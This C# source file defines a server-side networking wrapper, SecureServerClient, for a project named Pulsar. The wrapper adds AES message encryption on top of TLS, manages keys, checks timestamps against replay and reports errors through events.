using Pulsar.Common.Cryptography;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Security;

namespace Pulsar.Server.Networking
{
    /// <summary>
    /// Server-side secure client wrapper that adds AES encryption on top of TLS
    /// </summary>
    public class SecureServerClient : IEquatable<SecureServerClient>, ISender
    {
        private readonly Client _baseClient;
        private readonly Aes256 _aesEncryption;
        private bool _encryptionEnabled;

        /// <summary>
        /// Event fired when encryption/decryption errors occur
        /// </summary>
        public event EventHandler<string> EncryptionError;

        /// <summary>
        /// Gets whether AES encryption is currently enabled
        /// </summary>
        public bool EncryptionEnabled => _encryptionEnabled;

        /// <summary>
        /// Gets the underlying client instance
        /// </summary>
        public Client BaseClient => _baseClient;

        public bool Connected => _baseClient.Connected;
        public bool Identified => _baseClient.Identified;
        public IPEndPoint EndPoint => _baseClient.EndPoint;
        public UserState Value => _baseClient.Value;
        
        public event Client.ClientStateEventHandler ClientState
        {
            add => _baseClient.ClientState += value;
            remove => _baseClient.ClientState -= value;
        }

        public event Client.ClientReadEventHandler ClientRead;
        public event Client.ClientWriteEventHandler ClientWrite
        {
            add => _baseClient.ClientWrite += value;
            remove => _baseClient.ClientWrite -= value;
        }

        /// <summary>
        /// Initializes a new instance of the SecureServerClient class
        /// </summary>
        /// <param name="baseClient">The underlying client instance</param>
        /// <param name="aesKey">The AES key for encryption (if null, encryption will be disabled)</param>
        public SecureServerClient(Client baseClient, string aesKey = null)
        {
            _baseClient = baseClient ?? throw new ArgumentNullException(nameof(baseClient));

            if (!string.IsNullOrEmpty(aesKey))
            {
                try
                {
                    _aesEncryption = new Aes256(aesKey);
                    _encryptionEnabled = true;
                }
                catch (Exception ex)
                {
                    OnEncryptionError($"Failed to initialize AES encryption: {ex.Message}");
                    _encryptionEnabled = false;
                }
            }
            else
            {
                _encryptionEnabled = false;
            }

            _baseClient.ClientRead += OnBaseClientRead;
        }

        /// <summary>
        /// Creates a SecureServerClient with automatic key management
        /// </summary>
        /// <param name="baseClient">The underlying client instance</param>
        /// <param name="keyDirectory">Directory containing the KEY.txt file (optional)</param>
        /// <returns>A configured SecureServerClient instance</returns>
        public static SecureServerClient CreateWithManagedKey(Client baseClient, string keyDirectory = null)
        {
            try
            {
                string aesKey = AesKeyManager.LoadKey(keyDirectory);
                return new SecureServerClient(baseClient, aesKey);
            }
            catch (Exception ex)
            {
                // If key loading fails, create client without encryption
                var client = new SecureServerClient(baseClient);
                client.OnEncryptionError($"Failed to load AES key, encryption disabled: {ex.Message}");
                return client;
            }
        }

        /// <summary>
        /// Sends a message with AES encryption if enabled
        /// </summary>
        /// <typeparam name="T">The type of the message</typeparam>
        /// <param name="message">The message to send</param>
        public void Send<T>(T message) where T : IMessage
        {
            if (message == null) return;

            try
            {
                if (_encryptionEnabled && _aesEncryption != null && !(message is AesEncryptedMessage))
                {
                    var encryptedMessage = new AesEncryptedMessage(message, _aesEncryption);
                    _baseClient.Send(encryptedMessage);
                }
                else
                {
                    _baseClient.Send(message);
                }
            }
            catch (Exception ex)
            {
                OnEncryptionError($"Failed to encrypt message: {ex.Message}");
                _baseClient.Send(message);
            }
        }

        /// <summary>
        /// Handles incoming messages from the base client, decrypting AES encrypted messages
        /// </summary>
        private void OnBaseClientRead(Client sender, IMessage message, int messageLength)
        {
            if (message is AesEncryptedMessage encryptedMessage && _encryptionEnabled && _aesEncryption != null)
            {
                try
                {
                    if (!encryptedMessage.IsTimestampValid())
                    {
                        OnEncryptionError("Received message with invalid timestamp (possible replay attack)");
                        return;
                    }

                    IMessage decryptedMessage = encryptedMessage.DecryptMessage(_aesEncryption);
                    
                    ClientRead?.Invoke(sender, decryptedMessage, messageLength);
                }
                catch (Exception ex)
                {
                    OnEncryptionError($"Failed to decrypt received message: {ex.Message}");
                }
            }
            else if (!(message is AesEncryptedMessage))
            {
                ClientRead?.Invoke(sender, message, messageLength);
            }
        }

        /// <summary>
        /// Enables or disables AES encryption
        /// </summary>
        /// <param name="enabled">Whether to enable encryption</param>
        /// <param name="keyDirectory">Directory to load key from (optional)</param>
        public void SetEncryptionEnabled(bool enabled, string keyDirectory = null)
        {
            if (enabled && _aesEncryption == null)
            {
                try
                {
                    string aesKey = AesKeyManager.EnsureKeyExists(keyDirectory);
                    var newAes = new Aes256(aesKey);
                    typeof(SecureServerClient).GetField("_aesEncryption", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance)?.SetValue(this, newAes);
                }
                catch (Exception ex)
                {
                    OnEncryptionError($"Failed to enable encryption: {ex.Message}");
                    return;
                }
            }
            
            _encryptionEnabled = enabled && _aesEncryption != null;
        }

        /// <summary>
        /// Disconnects the client
        /// </summary>
        public void Disconnect()
        {
            _baseClient.Disconnect();
        }

        /// <summary>
        /// Fires the encryption error event
        /// </summary>
        private void OnEncryptionError(string errorMessage)
        {
            Debug.WriteLine("Very bad error: " + errorMessage);
            EncryptionError?.Invoke(this, errorMessage);
        }

        // IEquatable implementation
        public bool Equals(SecureServerClient other)
        {
            if (ReferenceEquals(null, other)) return false;
            if (ReferenceEquals(this, other)) return true;
            return _baseClient.Equals(other._baseClient);
        }

        public override bool Equals(object obj)
        {
            if (ReferenceEquals(null, obj)) return false;
            if (ReferenceEquals(this, obj)) return true;
            if (obj.GetType() != this.GetType()) return false;
            return Equals((SecureServerClient)obj);
        }

        public override int GetHashCode()
        {
            return _baseClient?.GetHashCode() ?? 0;
        }

        public static bool operator ==(SecureServerClient left, SecureServerClient right)
        {
            return Equals(left, right);
        }

        public static bool operator !=(SecureServerClient left, SecureServerClient right)
        {
            return !Equals(left, right);
        }
    }
}
